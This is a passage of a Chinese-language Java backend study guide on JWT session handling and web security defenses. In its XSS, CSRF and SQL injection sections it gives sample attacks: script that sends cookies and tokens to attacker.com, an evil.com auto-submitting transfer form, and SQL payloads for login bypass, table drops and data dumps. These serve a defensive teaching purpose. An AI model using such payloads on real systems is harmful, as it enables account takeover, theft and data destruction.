    private final StringRedisTemplate redis;
    private static final String ACCESS_BLACKLIST = "jwt:blacklist:access:";      // Access 黑名单
    private static final String REFRESH_WHITELIST = "jwt:refresh:";               // Refresh 白名单

    /** Access Token 加入黑名单（登出、修改密码、被踢下线时） */
    public void blacklistAccessToken(String jti, long ttlMillis) {
        // ★ TTL 设为 Token 的剩余有效期（过期后 Redis 自动清理，不会无限增长）
        redis.opsForValue().set(ACCESS_BLACKLIST + jti, "1",
                Duration.ofMillis(ttlMillis));
    }

    public boolean isAccessTokenBlacklisted(String jti) {
        return Boolean.TRUE.equals(redis.hasKey(ACCESS_BLACKLIST + jti));
    }

    /** 保存 Refresh Token（白名单） */
    public void saveRefreshToken(Long userId, String jti, Duration ttl) {
        redis.opsForValue().set(REFRESH_WHITELIST + userId + ":" + jti,
                String.valueOf(System.currentTimeMillis()), ttl);
    }

    public boolean isRefreshTokenValid(Long userId, String jti) {
        return Boolean.TRUE.equals(redis.hasKey(REFRESH_WHITELIST + userId + ":" + jti));
    }

    /** ★ Refresh Token 轮换：删旧加新（用 Lua 保证原子性） */
    public void rotateRefreshToken(Long userId, String oldJti, String newJti, Duration ttl) {
        String script = """
            redis.call('DEL', KEYS[1])
            redis.call('SET', KEYS[2], ARGV[1], 'EX', ARGV[2])
            return 1
            """;
        redis.execute(new DefaultRedisScript<>(script, Long.class),
                List.of(REFRESH_WHITELIST + userId + ":" + oldJti,
                        REFRESH_WHITELIST + userId + ":" + newJti),
                String.valueOf(System.currentTimeMillis()),
                String.valueOf(ttl.toSeconds()));
    }

    public void removeRefreshToken(Long userId, String jti) {
        redis.delete(REFRESH_WHITELIST + userId + ":" + jti);
    }

    /** ★ 踢掉用户所有会话（修改密码、账号封禁、管理员强制下线） */
    public void kickOutUser(Long userId) {
        // 删除该用户所有 Refresh Token（用 SCAN 而非 KEYS，避免阻塞 Redis）
        Set<String> keys = redis.keys(REFRESH_WHITELIST + userId + ":*");      // ⚠️ 生产用 scan
        if (keys != null && !keys.isEmpty()) redis.delete(keys);
        // ★ 同时把该用户当前所有 Access Token 拉黑：
        //   方案 A：记录用户的 tokenVersion，Token 中带 version，校验时比对（推荐，O(1)）
        //   方案 B：把「用户级失效时间戳」存 Redis，Token 的 iat 早于该时间戳则拒绝
        redis.opsForValue().set("jwt:user:invalidate:" + userId,
                String.valueOf(System.currentTimeMillis() / 1000), Duration.ofDays(1));
    }

    /** 校验 Token 的签发时间是否早于「用户级失效时间」 */
    public boolean isIssuedBeforeInvalidation(Long userId, Date issuedAt) {
        String ts = redis.opsForValue().get("jwt:user:invalidate:" + userId);
        if (ts == null) return false;
        return issuedAt.getTime() / 1000 < Long.parseLong(ts);
    }
}
```

```java
// ─── 4. 用户上下文（ThreadLocal）───
public final class UserContext {
    private static final ThreadLocal<LoginUser> HOLDER = new NamedThreadLocal<>("UserContext");

    private UserContext() { }
    public static void set(LoginUser user) { HOLDER.set(user); }
    public static LoginUser get() { return HOLDER.get(); }
    public static void clear() { HOLDER.remove(); }                    // ★ 必须清理

    public static Long getUserId() {
        LoginUser u = HOLDER.get();
        return u == null ? null : u.getUserId();
    }
    public static Long requireUserId() {
        Long id = getUserId();
        if (id == null) throw new BusinessException(ResultCode.UNAUTHORIZED, "未登录");
        return id;
    }
    public static boolean hasRole(String role) {
        LoginUser u = HOLDER.get();
        return u != null && u.getRoles() != null && u.getRoles().contains(role);
    }
    public static boolean hasPermission(String perm) {
        LoginUser u = HOLDER.get();
        if (u == null) return false;
        if (u.getRoles().contains("ADMIN")) return true;                // 超管放行
        return u.getPermissions() != null && u.getPermissions().contains(perm);
    }
}

// ★ 跨线程传递（异步任务中拿不到 ThreadLocal）见
//   [[后端/Java基础/并发编程/JUC工具类与ThreadLocal]] 的 TransmittableThreadLocal
//   [[后端/Java基础/并发编程/线程池原理与实战]] 的 TaskDecorator
```

```javascript
// ─── 5. 前端的 Token 刷新逻辑（axios 拦截器，★ 处理并发刷新）───
let isRefreshing = false
let pendingRequests = []               // ★ 等待刷新的请求队列

http.interceptors.response.use(
  res => res.data,
  async error => {
    const { config, response } = error
    if (response?.status !== 401 || config._retry) return Promise.reject(error)

    // ★ 并发控制：多个请求同时 401 时，只刷新一次，其他排队等待
    if (isRefreshing) {
      return new Promise(resolve => {
        pendingRequests.push(token => {
          config.headers.Authorization = `Bearer ${token}`
          resolve(http(config))
        })
      })
    }

    isRefreshing = true
    config._retry = true
    try {
      const { accessToken } = await http.post('/auth/refresh')     // Cookie 自动带上
      localStorage.setItem('accessToken', accessToken)
      // ★ 重放排队的请求
      pendingRequests.forEach(cb => cb(accessToken))
      pendingRequests = []
      config.headers.Authorization = `Bearer ${accessToken}`
      return http(config)
    } catch (e) {
      // ★ Refresh 也失效 → 跳登录页
      localStorage.clear()
      router.push('/login?redirect=' + router.currentRoute.value.fullPath)
      return Promise.reject(e)
    } finally {
      isRefreshing = false
    }
  }
)
```

## 5. JWT vs Session 的终极对比 ★★★★★

| 对比项 | **Session（+ Cookie）** | **JWT** |
| --- | --- | --- |
| 状态 | **有状态**（服务端存储） | **无状态**（客户端存储，服务端只验签） |
| 服务端存储 | 每用户一份 Session（内存/Redis） | ★ 无（或只存黑名单/Refresh 白名单） |
| 扩展性 | 需 Session 共享（Redis/Sticky） | ★ **天然支持水平扩展** |
| 跨域 | ❌ Cookie 受同源和 SameSite 限制 | ★ **支持**（放 Header，不受 Cookie 限制） |
| 移动端/小程序 | ❌ 不友好（无 Cookie 概念） | ★ **友好** |
| **主动失效**（登出/踢人） | ✅ **容易**（invalidate） | ❌ **难**（需 Redis 黑名单，破坏无状态性） |
| **权限实时变更** | ✅ 改 Session 立即生效 | ❌ Token 未过期前权限不变（需版本号机制） |
| 存储开销 | 服务端内存/Redis | **客户端**（每次请求都传输，增加带宽） |
| 传输开销 | 只传 SessionID（几十字节） | ★ **传整个 Token**（几百字节~几 KB，每请求都带） |
| 安全性 | Cookie 可被 XSS 窃取（HttpOnly 缓解）、CSRF | Token 可被 XSS 窃取（若存 localStorage）、**无 CSRF 问题**（不用 Cookie） |
| 信息可见性 | 客户端看不到内容 | ★ **Payload 可被解码查看**（不能放敏感信息） |
| 性能 | 每次请求要查 Redis（网络开销） | ★ **本地验签**（CPU 开销，无网络） |
| 单点登录/注销 | 容易 | 需要额外机制 |
| 适用场景 | 传统单体、需要强会话控制 | ★ **微服务、前后端分离、移动端、开放 API** |

**决策建议：**

| 场景 | 推荐 |
| --- | --- |
| 单体应用 + 服务端渲染（Thymeleaf/JSP） | **Session**（简单，无需处理刷新逻辑） |
| 前后端分离 + 单体后端 | 两者都可；Session + Redis 更简单，JWT 更灵活 |
| **微服务架构** | ★ **JWT**（服务间无需共享 Session） |
| **移动端 APP / 小程序** | ★ **JWT**（无 Cookie） |
| **开放 API / 第三方接入** | ★ **JWT**（OAuth2 / OIDC 标准） |
| 需要「管理员强制踢人」「实时改权限」 | Session，或 **JWT + Redis 黑名单/版本号** |
| 高安全金融场景 | Session + 多重校验，或短 TTL 的 JWT + 严格黑名单 |

> 【面试标准答案】**JWT 的优缺点**：
> - **优点**：无状态易扩展、跨域跨平台、服务端无存储压力、本地验签性能好、自包含用户信息。
> - **缺点**：① **无法主动失效**（登出/踢人需要额外的黑名单机制，本质上又变成有状态）；② **Token 体积大**（每请求都传输）；③ **Payload 可被解码**（不能放敏感信息）；④ **权限变更不实时**；⑤ 密钥管理复杂（泄漏即全盘失守）；⑥ 续签机制复杂（双 Token）。
> - **结论**：不是「JWT 一定比 Session 好」，而是**架构决定选型**。微服务/移动端选 JWT，传统单体选 Session。

## 6. Web 安全攻防 ★★★★★

### 6.1 XSS（跨站脚本攻击）

**攻击者注入恶意脚本到页面，在其他用户的浏览器中执行，窃取 Cookie/Token、伪造操作。**

| 类型 | 原理 | 示例 |
| --- | --- | --- |
| **存储型（Stored）** ★ 最危险 | 恶意脚本**存入数据库**，所有访问者都中招 | 评论区提交 `<script>窃取cookie</script>`，其他用户查看该评论时执行 |
| **反射型（Reflected）** | 恶意脚本在 **URL 参数**中，服务端直接回显 | `search?q=<script>...</script>`，搜索结果页回显 q |
| **DOM 型** | 前端 JS 直接把不可信数据插入 DOM | `innerHTML = location.hash` |
| **mXSS（变异型）** | 浏览器解析 HTML 时「变异」出脚本，绕过过滤 | `<svg onload=...>`、`<noscript><p title="</noscript><img src=x onerror=...>">` |

```javascript
// 攻击代码示例
// ① 窃取 Cookie（若未设 HttpOnly）
<script>
  new Image().src = 'https://attacker.com/steal?c=' + encodeURIComponent(document.cookie);
</script>

// ② 窃取 localStorage 中的 JWT（★ 这是 JWT 存 localStorage 的最大风险）
<script>
  fetch('https://attacker.com/steal?t=' + localStorage.getItem('accessToken'));
</script>

// ③ 伪造请求（用受害者的登录态转账）
<script>
  fetch('/api/transfer', {method:'POST', credentials:'include',
    headers:{'Content-Type':'application/json'},
    body: JSON.stringify({to:'attacker', amount:10000})});
</script>

// ④ 键盘记录、页面钓鱼、挖矿、蠕虫传播（如 2005 年 Samy 蠕虫，20 小时感染 100 万 MySpace 用户）
```

**XSS 的防御（多层防护，★ 缺一不可）：**

```java
// ─── ① 输出编码（★ 最有效，按上下文选择编码方式）───
// HTML 内容中：转义 < > & " '
String safe = HtmlUtils.htmlEscape(userInput);              // Spring
String safe2 = StringEscapeUtils.escapeHtml4(userInput);    // Commons Text
String safe3 = Encode.forHtml(userInput);                   // ★ OWASP Java Encoder（推荐）

// HTML 属性中
Encode.forHtmlAttribute(userInput);

// JavaScript 代码中
Encode.forJavaScript(userInput);

// URL 参数中
Encode.forUriComponent(userInput);
URLEncoder.encode(userInput, StandardCharsets.UTF_8);

// CSS 中
Encode.forCss(userInput);

// Thymeleaf：th:text 默认转义（安全），th:utext 不转义（危险）
<p th:text="${userInput}"></p>      <!-- ✅ 自动转义 -->
<p th:utext="${userInput}"></p>     <!-- ❌ 不转义，XSS 风险 -->

// JSP：<c:out> 默认转义，${} 不转义
<c:out value="${userInput}"/>       <!-- ✅ -->
${userInput}                         <!-- ❌ -->

// React：{value} 默认转义，dangerouslySetInnerHTML 不转义
<div>{userInput}</div>               {/* ✅ */}
<div dangerouslySetInnerHTML={{__html: userInput}}/>   {/* ❌ */}

// Vue：{{ }} 默认转义，v-html 不转义
<div>{{ userInput }}</div>           <!-- ✅ -->
<div v-html="userInput"></div>       <!-- ❌ -->

// ─── ② 富文本白名单清洗（需要保留 HTML 格式时）───
// ★ Jsoup（白名单策略，最实用）
String safeHtml = Jsoup.clean(untrustedHtml, Safelist.basic());            // 基础标签
String safeHtml2 = Jsoup.clean(untrustedHtml, Safelist.relaxed());         // 宽松（含表格等）
// 自定义白名单
Safelist safelist = Safelist.basicWithImages()
        .addTags("figure", "figcaption", "video", "source")
        .addAttributes("video", "controls", "width")
        .addProtocols("img", "src", "http", "https")          // ★ 限制协议（防 javascript:）
        .removeTags("script", "iframe", "object", "embed");   // 明确移除危险标签
String safe3 = Jsoup.clean(untrustedHtml, safelist);

// OWASP Java HTML Sanitizer（Google 出品，性能更好）
PolicyFactory policy = new HtmlPolicyBuilder()
        .allowElements("p", "div", "span", "a", "img", "b", "i", "ul", "ol", "li")
        .allowAttributes("href").onElements("a")
        .allowAttributes("src", "alt").onElements("img")
        .allowStandardUrlProtocols()                          // http/https/mailto
        .toFactory();
String safe4 = policy.sanitize(untrustedHtml);

// ─── ③ 输入校验（辅助手段，不能单独依赖）───
@Pattern(regexp = "^[\\u4e00-\\u9fa5a-zA-Z0-9_]{2,20}$", message = "昵称只能包含中英文、数字、下划线")
private String nickname;
// ★ 白名单校验优于黑名单过滤（黑名单总能被绕过）

// ─── ④ Cookie 设 HttpOnly ───
server.servlet.session.cookie.http-only=true       // ★ document.cookie 读不到 Session Cookie
// ⚠️ 但 localStorage 中的 JWT 无法用 HttpOnly 保护 → 这是「JWT 存 localStorage」的固有风险

// ─── ⑤ CSP（Content-Security-Policy）★★★ 纵深防御的关键 ───
// Nginx 或后端设置响应头，限制浏览器只能加载指定来源的脚本
add_header Content-Security-Policy "
    default-src 'self';
    script-src 'self' https://cdn.example.com;      /* ★ 只允许自己和可信 CDN 的脚本 */
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com;     /* ★ 限制 ajax 目标（防数据外传）*/
    frame-ancestors 'none';                          /* ★ 防点击劫持 */
    object-src 'none';                               /* ★ 禁用 Flash/插件 */
    base-uri 'self';
    form-action 'self';
    upgrade-insecure-requests;                       /* ★ HTTP 自动升级 HTTPS */
" always;

// Java 中设置
response.setHeader("Content-Security-Policy",
    "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'");

// CSP 的效果：即使攻击者成功注入了 <script>，
//   ① 内联脚本被禁止执行（除非有 'unsafe-inline'）
//   ② 外发请求被 connect-src 限制（数据偷不走）
//   → XSS 的危害被大幅削弱

// ─── ⑥ 其他 ───
// - 避免 eval()、innerHTML、document.write、new Function()
// - 用 nonce 或 hash 允许特定的内联脚本：script-src 'nonce-{random}'
// - 定期用扫描工具检测（OWASP ZAP、Burp Suite、xsser）
```

### 6.2 CSRF（跨站请求伪造）

**攻击者诱导已登录用户的浏览器，向目标站点发送非预期的请求（利用浏览器自动携带 Cookie 的特性）。**

```html
<!-- 攻击者的网站 evil.com -->
<!-- 场景：用户已登录 bank.com（有 Cookie），然后访问了 evil.com -->

<!-- ① 自动提交的表单（GET/POST 都能伪造） -->
<form id="hack" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="toAccount" value="attacker-666"/>
    <input type="hidden" name="amount" value="10000"/>
</form>
<script>document.getElementById('hack').submit();</script>
<!-- ★ 浏览器会自动带上 bank.com 的 Cookie → 转账成功！ -->

<!-- ② 图片请求（GET 型 CSRF，最隐蔽） -->
<img src="https://bank.com/transfer?to=attacker&amount=10000" style="display:none"/>

<!-- ③ ajax（受同源策略限制，但配合 CORS 配置不当仍可能成功） -->
```

**CSRF 的防御：**

| 方案 | 原理 | 有效性 |
| --- | --- | --- |
| **① SameSite Cookie** ★ | `SameSite=Lax/Strict` 禁止跨站请求携带 Cookie | **现代浏览器的默认防线**（Chrome 80+ 默认 Lax） |
| **② CSRF Token** ★★ | 服务端生成随机 Token，表单/请求头带上，服务端校验 | **最可靠** |
| **③ 校验 Referer / Origin** | 请求来源必须是本站 | 有效但可被绕过（Referer 可能为空/被隐私策略去掉） |
| **④ 二次验证** | 敏感操作要求输密码/短信验证码 | 有效（用户体验差） |
| **⑤ JWT 放 Header** ★ | Token 不通过 Cookie 传输，浏览器不会自动带 | ★ **JWT 天然免疫 CSRF** |

```java
// ─── Spring Security 的 CSRF 防护（默认开启）───
http.csrf(csrf -> csrf
    .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())   // ★ Token 存 Cookie，前端读取
    // 或 HttpSessionCsrfTokenRepository（存 Session）
    .csrfTokenRequestHandler(new XorCsrfTokenRequestAttributeHandler())    // ★ BREACH 防护（每次不同）
    .ignoringRequestMatchers("/api/public/**", "/webhook/**")              // 白名单
);

// 流程：
// ① GET /page → 响应 Set-Cookie: XSRF-TOKEN=xxx（HttpOnly=false，让 JS 能读）
// ② 前端读取 Cookie，放到请求头 X-XSRF-TOKEN: xxx
// ③ POST /api/xxx（带 Cookie + X-XSRF-TOKEN 头）
// ④ 服务端比对：Cookie 中的 Token == 请求头中的 Token → 通过
// ★ 原理：攻击者的网站能触发带 Cookie 的请求，但【读不到】Cookie 内容（同源策略），
//        所以无法在请求头中带上正确的 Token

// 前端（axios 自动处理）
axios.defaults.xsrfCookieName = 'XSRF-TOKEN'
axios.defaults.xsrfHeaderName = 'X-XSRF-TOKEN'

// ─── ★ 前后端分离 + JWT 的场景：可以关闭 CSRF ───
http.csrf(AbstractHttpConfigurer::disable);        // ★ JWT 放 Header，浏览器不会自动携带 → 无 CSRF 风险
// 前提：Token 不存在 Cookie 中！如果 JWT 放在 Cookie 里自动发送，CSRF 风险依然存在
```

> 【结论】**用 JWT + Authorization Header 的架构天然免疫 CSRF**（这也是 JWT 的一个优势）。但如果 JWT 存在 Cookie 中并自动发送，就必须做 CSRF 防护。传统 Session + Cookie 架构**必须**开启 CSRF 防护。

### 6.3 SQL 注入 ★★★★★

```java
// ─── 攻击原理：用户输入被拼接进 SQL，改变了 SQL 的语义 ───
// ❌ 危险：字符串拼接
String sql = "SELECT * FROM user WHERE username = '" + username + "' AND password = '" + password + "'";
// 攻击者输入：username = ' or '1'='1' --   password = 任意
// 拼接后：SELECT * FROM user WHERE username = '' or '1'='1' --' AND password = '任意'
//                                       ↑ 恒真条件          ↑ -- 注释掉了后面的密码校验
// ★ 结果：绕过登录！

// 更严重的攻击：
// username = '; DROP TABLE user; --       → 删表
// username = ' UNION SELECT username, password FROM admin --   → ★ 拖库（窃取管理员密码）
// id = 1 AND SLEEP(5)                     → 时间盲注（探测数据）
// id = 1 AND (SELECT COUNT(*) FROM information_schema.tables) > 0  → 探测数据库结构
```

**防御（★ 参数化查询是唯一可靠方案）：**

```java
// ─── ① PreparedStatement（JDBC 层面，★ 根本解法）───
String sql = "SELECT * FROM user WHERE username = ? AND password = ?";
try (PreparedStatement ps = conn.prepareStatement(sql)) {
    ps.setString(1, username);          // ★ 参数值与 SQL 结构分离，永远不会改变 SQL 语义
    ps.setString(2, password);
    try (ResultSet rs = ps.executeQuery()) { }
}
// 原理：PreparedStatement 先编译 SQL 结构（? 是占位符），再传入参数值，
//      参数值只会被当作「数据」，不可能被解析为「SQL 语句」

// ─── ② MyBatis：#{} vs ${} ★★★★★（必考）───
// ✅ #{}：预编译占位符（生成 ?，用 PreparedStatement）—— 安全
<select id="selectByName" resultType="User">
    SELECT * FROM user WHERE username = #{username}
</select>
// 生成：SELECT * FROM user WHERE username = ?   → setString(1, username)

// ❌ ${}：直接字符串替换 —— ★ SQL 注入风险
<select id="selectByName" resultType="User">
    SELECT * FROM user WHERE username = '${username}'
</select>
// 生成：SELECT * FROM user WHERE username = '输入值'   → 输入值可注入

// ${} 的合法用途（只能用在这些地方，且必须白名单校验！）：
// ① 动态表名
SELECT * FROM ${tableName}      <!-- tableName 必须来自白名单，绝不能来自用户输入 -->
// ② 动态列名 / 排序字段（★ ORDER BY 不能用 #{}，因为 ? 只能替代值不能替代标识符）
<select id="list">
    SELECT * FROM user
    ORDER BY ${orderByColumn} ${orderByDirection}
</select>
// ★ 必须白名单校验！
private static final Set<String> ALLOWED_COLUMNS = Set.of("id", "create_time", "name", "amount");
private static final Set<String> ALLOWED_DIRECTIONS = Set.of("ASC", "DESC");
public void validateSort(String column, String direction) {
    if (!ALLOWED_COLUMNS.contains(column)) throw new BusinessException("非法排序字段");
    if (!ALLOWED_DIRECTIONS.contains(direction.toUpperCase())) throw new BusinessException("非法排序方向");
}
// ③ 动态 SQL 片段（<include refid>）

// MyBatis-Plus 的排序（已做防护，但传字段名时仍需注意）
queryWrapper.orderByDesc("create_time");     // 字符串字段名 → ★ 建议用常量或枚举，不接受用户输入
queryWrapper.orderByDesc(User::getCreateTime);   // ✅ Lambda 方式，类型安全

// ─── ③ JPA / Hibernate ───
// ✅ JPQL 参数绑定
@Query("SELECT u FROM User u WHERE u.username = :name")
User findByName(@Param("name") String name);
// ✅ 原生 SQL 参数绑定
@Query(value = "SELECT * FROM user WHERE username = ?1", nativeQuery = true)
User findByNameNative(String name);
// ✅ Criteria API（类型安全，无注入风险）
// ❌ 拼接 JPQL/SQL 字符串
@Query("SELECT u FROM User u WHERE u.username = '" + name + "'")   // 编译期拼接也有风险

// ─── ④ JdbcTemplate ───
// ✅ 参数化
jdbcTemplate.query("SELECT * FROM user WHERE id = ?", rowMapper, id);
jdbcTemplate.query("SELECT * FROM user WHERE name = ? AND age > ?", rowMapper, name, age);
jdbcTemplate.queryForObject(sql, User.class, new MapSqlParameterSource().addValue("id", id));
// ❌ 字符串拼接
jdbcTemplate.query("SELECT * FROM user WHERE id = " + id, rowMapper);
// ✅ NamedParameterJdbcTemplate
String sql = "SELECT * FROM user WHERE name = :name AND age > :age";
Map<String, Object> params = Map.of("name", name, "age", age);
jdbcTemplate.query(sql, new MapSqlParameterSource(params), rowMapper);

// ─── ⑤ IN 查询的参数化（★ 常见坑）───
// ❌ 拼接
"SELECT * FROM user WHERE id IN (" + String.join(",", ids) + ")"
// ✅ MyBatis foreach
<select id="selectByIds">
    SELECT * FROM user WHERE id IN
    <foreach collection="ids" item="id" open="(" separator="," close=")">
        #{id}
    </foreach>
</select>
// ✅ JdbcTemplate
String placeholders = ids.stream().map(x -> "?").collect(Collectors.joining(","));
jdbcTemplate.query("SELECT * FROM user WHERE id IN (" + placeholders + ")", rowMapper, ids.toArray());

// ─── ⑥ 纵深防御 ───
// a. 最小权限数据库账号（★ 应用账号绝不能有 DROP/ALTER/GRANT 权限）
//    CREATE USER 'app'@'%' IDENTIFIED BY '...';
//    GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'app'@'%';   -- ★ 不给 DDL 权限
// b. 输入校验（白名单：类型、长度、格式、范围）
// c. 输出转义（防止查询结果中的恶意数据造成二次注入/XSS）
// d. 敏感数据加密存储（密码用 BCrypt，即使拖库也无法直接使用）
// e. WAF（Web 应用防火墙）拦截常见注入特征
// f. 定期用 SQLMap 等工具做安全扫描
// g. 错误信息不暴露 SQL（生产环境关闭 SQL 异常详情）
```

### 6.4 其他常见攻击与防御

| 攻击 | 原理 | 防御 |
| --- | --- | --- |
| **点击劫持**（Clickjacking） | 用透明 iframe 覆盖在诱骗按钮上，用户以为点的是 A 实际点的是 B | ★ `X-Frame-Options: DENY/SAMEORIGIN`、CSP `frame-ancestors 'none'` |
| **URL 跳转漏洞** | `login?redirect=` 参数未校验，跳到钓鱼站 | ★ 白名单校验跳转域名，或只允许相对路径 |
| **文件上传漏洞** | 上传 `.jsp`/`.php` 到可执行目录 → getshell | ★ 白名单校验扩展名和 MIME、重命名为随机名、存到不可执行目录（或 OSS）、图片二次渲染、限制大小 |
| **目录遍历** | `download?file=../../../etc/passwd` | ★ `normalize()` 后校验是否在允许目录内 |
| **SSRF**（服务端请求伪造） | 让服务端请求内网地址（探测内网、访问云元数据） | ★ 白名单域名/IP、禁止内网段（10./172.16./192.168./169.254.169.254）、禁止重定向、限制协议（只允许 http/https） |
| **XXE**（XML 外部实体注入） | XML 中定义外部实体读取本地文件/发起请求 | ★ 禁用 DTD 和外部实体（`disallow-doctype-decl`、`external-general-entities=false`）；优先用 JSON |
| **反序列化漏洞** | 恶意序列化数据触发 gadget chain 执行任意代码 | ★ 不用 Java 原生序列化；用 JSON/Protobuf；开启 JEP 290 过滤；升级到修复版本（Shiro、Fastjson、Commons Collections 历史漏洞） |
| **暴力破解** | 遍历密码字典 | ★ 登录失败次数限制 + 验证码 + 账号锁定 + 密码强度要求 + BCrypt（慢哈希） |
| **短信/邮件轰炸** | 无限调用发送接口 | ★ 频率限制（同手机号 1 分钟 1 条、1 天 10 条）+ 图形验证码 + IP 限流 |
| **越权访问**（水平/垂直） | 水平：改 ID 看别人数据；垂直：普通用户调管理员接口 | ★★ **每个请求都校验「资源归属」和「权限」**，不能只在前端隐藏按钮 |
| **重放攻击** | 截获请求后重复发送 | ★ nonce + timestamp + 签名，且 nonce 存 Redis 短期去重 |
| **中间人攻击** | 窃听/篡改 HTTP 流量 | ★ 全站 HTTPS + HSTS + 证书校验（不信任所有证书） |
| **弱密码/默认密码** | admin/123456 | ★ 强制密码策略、首次登录改密、禁用默认账号 |
| **敏感信息泄漏** | 错误栈、SQL、配置暴露给前端 | ★ 生产环境统一错误响应、关闭 debug、日志脱敏 |
| **拒绝服务**（DoS/CC） | 大量请求耗尽资源 | ★ Nginx 限流、Sentinel、CDN、验证码、连接数限制 |

```java
// ─── 越权访问防护（★ 最容易被忽视、危害最大的漏洞）───
// ❌ 水平越权：只按 ID 查询，不校验归属
@GetMapping("/orders/{id}")
public Result<Order> getOrder(@PathVariable Long id) {
    return Result.success(orderMapper.selectById(id));      // ★ 任何人都能查任何订单！
}

// ✅ 正确：查询条件带上当前用户 ID
@GetMapping("/orders/{id}")
public Result<Order> getOrder(@PathVariable Long id) {
    Long userId = UserContext.requireUserId();
    Order order = orderMapper.selectByIdAndUserId(id, userId);   // ★ WHERE id=? AND user_id=?
    if (order == null) throw new BusinessException(ResultCode.ORDER_NOT_FOUND);   // 不区分「不存在」和「无权限」
    return Result.success(order);
}

// ✅ 管理员接口：校验权限（垂直越权防护）
@GetMapping("/admin/users")
@RequiresPermission("user:manage")           // ★ 服务端校验，不能只靠前端隐藏菜单
public Result<List<User>> listUsers() { }

// ✅ MyBatis-Plus 的多租户插件（自动加 tenant_id 条件，防止跨租户越权）
@Bean
public MybatisPlusInterceptor mybatisPlusInterceptor() {
    MybatisPlusInterceptor interceptor = new MybatisPlusInterceptor();
    interceptor.addInnerInterceptor(new TenantLineInnerInterceptor(new TenantLineHandler() {
        @Override public Expression getTenantId() { return new LongValue(UserContext.getTenantId()); }
        @Override public String getTenantIdColumn() { return "tenant_id"; }
        @Override public boolean ignoreTable(String tableName) { return "sys_config".equals(tableName); }
    }));
    return interceptor;
}

// ─── 文件上传的安全校验 ───
public String upload(MultipartFile file) throws IOException {
    // ① 大小限制（Spring 配置 + 代码校验）
    if (file.getSize() > 10 * 1024 * 1024) throw new BusinessException("文件超过 10MB");

    // ② ★ 扩展名白名单（不是黑名单！）
    String ext = FilenameUtils.getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of("jpg", "jpeg", "png", "gif", "pdf").contains(ext)) {
        throw new BusinessException("不支持的文件类型");
    }

    // ③ ★ MIME 类型校验（可伪造，作为辅助）
    String contentType = file.getContentType();
    if (!Set.of("image/jpeg", "image/png", "image/gif", "application/pdf").contains(contentType)) {
        throw new BusinessException("文件类型不合法");
    }

    // ④ ★★ 魔数校验（文件头，最难伪造）
    byte[] header = new byte[8];
    try (InputStream is = file.getInputStream()) { is.read(header); }
    if (!isValidMagicNumber(header, ext)) throw new BusinessException("文件内容与扩展名不符");
    // JPEG: FF D8 FF   PNG: 89 50 4E 47   PDF: 25 50 44 46   GIF: 47 49 46 38

    // ⑤ 图片二次渲染（★ 彻底清除图片中可能嵌入的恶意代码）
    if (isImage(ext)) {
        BufferedImage img = ImageIO.read(file.getInputStream());
        if (img == null) throw new BusinessException("无效的图片");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ImageIO.write(img, ext, bos);                        // ★ 重新编码，附带的恶意脚本被清除
        file = new MockMultipartFile(file.getName(), bos.toByteArray());
    }

    // ⑥ ★ 重命名（UUID，防止路径穿越和覆盖）
    String newName = UUID.randomUUID().toString().replace("-", "") + "." + ext;
    String datePath = LocalDate.now().format(DateTimeFormatter.ofPattern("yyyy/MM/dd"));
    Path target = Paths.get(uploadRoot, datePath, newName).normalize();

    // ⑦ ★ 校验目标路径在允许的根目录内（防路径穿越）
    if (!target.startsWith(Paths.get(uploadRoot).normalize())) {
        throw new BusinessException("非法路径");
    }

    // ⑧ ★ 存到不可执行的目录（或 OSS），上传目录禁止执行脚本
    Files.createDirectories(target.getParent());
    file.transferTo(target.toFile());

    // ⑨ 返回访问 URL（不暴露物理路径）
    return "/files/" + datePath + "/" + newName;
}
// Nginx 层加固：
// location /files/ { 
//     alias /data/uploads/;
//     # ★ 禁止执行脚本
//     location ~* \.(jsp|jspx|php|asp|aspx|sh|py)$ { deny all; }
// }
```

### 6.5 安全响应头清单（★ 生产标配）

```java
// 统一在 Filter 或 Nginx 中设置
@Component
public class SecurityHeaderFilter extends OncePerRequestFilter {
    @Override
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse resp, FilterChain chain)
            throws ServletException, IOException {
        // ① 防 MIME 嗅探
        resp.setHeader("X-Content-Type-Options", "nosniff");
        // ② 防点击劫持
        resp.setHeader("X-Frame-Options", "DENY");
        // ③ CSP（★ 防 XSS 的纵深防御）
        resp.setHeader("Content-Security-Policy",
            "default-src 'self'; script-src 'self'; object-src 'none'; "
          + "frame-ancestors 'none'; base-uri 'self'; form-action 'self'; upgrade-insecure-requests");
        // ④ HSTS（强制 HTTPS）
        resp.setHeader("Strict-Transport-Security", "max-age=31536000; includeSubDomains; preload");
        // ⑤ Referrer 策略（防止 URL 泄漏到第三方）
        resp.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");
        // ⑥ 权限策略（禁用不需要的浏览器 API）
        resp.setHeader("Permissions-Policy", "geolocation=(), microphone=(), camera=()");
        // ⑦ ★ 隐藏服务器信息
        resp.setHeader("Server", "");                              // 清空（Tomcat 的 server 属性更彻底）
        resp.setHeader("X-Powered-By", "");
        // ⑧ 跨域隔离（防 Spectre 类攻击，可选）
        // resp.setHeader("Cross-Origin-Opener-Policy", "same-origin");
        // resp.setHeader("Cross-Origin-Resource-Policy", "same-origin");

        chain.doFilter(req, resp);
    }
}
```

```java
// ─── 密码存储：BCrypt（★ 绝不能用 MD5/SHA 直接哈希）───
// 为什么不能用 MD5/SHA1/SHA256？
// 1. 太快：GPU 每秒可计算数十亿次，暴力破解成本极低
// 2. 彩虹表：常见密码的哈希值已被预计算并公开（cmd5.com 可直接反查）
// 3. 相同密码产生相同哈希（无盐时）→ 可识别出「哪些用户密码相同」

// ✅ BCrypt 的优势：
// ① 内置随机盐（同一密码每次哈希结果不同）
// ② ★ 可调的慢因子（cost，默认 10 = 2^10 次迭代），随硬件升级可调高
// ③ 抗 GPU/ASIC 暴力破解（内存硬）

@Service
@RequiredArgsConstructor
public class PasswordService {
    // Spring Security 提供
    private final PasswordEncoder encoder = new BCryptPasswordEncoder(12);   // ★ cost=12（约 250ms/次）

    /** 注册/改密时：加密存储 */
    public String encode(String rawPassword) {
